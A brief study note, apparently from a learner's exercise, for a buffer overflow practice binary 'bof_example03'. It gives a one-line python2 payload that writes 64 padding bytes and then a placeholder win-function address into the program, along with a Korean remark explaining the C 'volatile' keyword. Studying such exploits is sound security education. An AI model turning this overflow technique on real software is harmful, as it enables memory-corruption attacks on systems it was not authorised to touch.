# CODE NAME : bof_example03.c

```
[+]Exploit
python2 -c "print 'a'*64 + {win function address}" | ./bof_example03


[+]Note
: 

[+]Refer
: volatile는 해당 변수를 최적화에서 제외하여 항상 메모리에 접근하도록 만듬, 즉 이 변수는
언제든지 값이 바뀔 수 있으니까 항상 메모리에 접근할라고 컴파일러에게 알려주는 것
```